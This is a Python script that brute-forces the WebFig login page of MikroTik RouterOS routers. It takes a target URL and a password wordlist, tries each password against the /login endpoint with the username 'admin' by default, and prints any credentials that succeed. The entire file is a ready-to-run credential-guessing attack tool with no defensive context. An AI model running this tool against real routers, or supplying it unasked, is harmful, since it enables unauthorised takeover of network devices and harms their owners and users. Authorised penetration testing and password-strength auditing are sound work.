import requests
import argparse

def first_html(url):
    html_attempt = requests.get(url)
    return html_attempt.text

def login(url, user, password):
    login_url = url + "/login"
    data = {
        "name": user,
        "password": password
    }
    login_attempt = requests.post(login_url, data=data, timeout=10)
    response_content = login_attempt.text

    if "WebFig Login:" not in response_content:
        return True  # Successful login
    return False  # Failed login

def bruteforce(url, user, wordlist):
    with open(wordlist, 'r') as f:
        passwords = f.readlines()

    total_passwords = len(passwords)
    for idx, password in enumerate(passwords, start=1):
        password = password.strip()
        print(f"Attempt {idx} of {total_passwords} - Trying password: {password}")
        if login(url, user, password):
            print(f"Login successful! User: {user}, Password: {password}")
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Bruteforce login for MikroTik RouterOS WebFig.")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL (e.g. http://10.0.0.1)")
    parser.add_argument('-w', '--wordlist', type=str, required=True, help="Path to the password wordlist")
    parser.add_argument('-user', '--username', type=str, default='admin', help="Username to test against. Default is 'admin'.")
    args = parser.parse_args()

    bruteforce(args.url, args.username, args.wordlist)
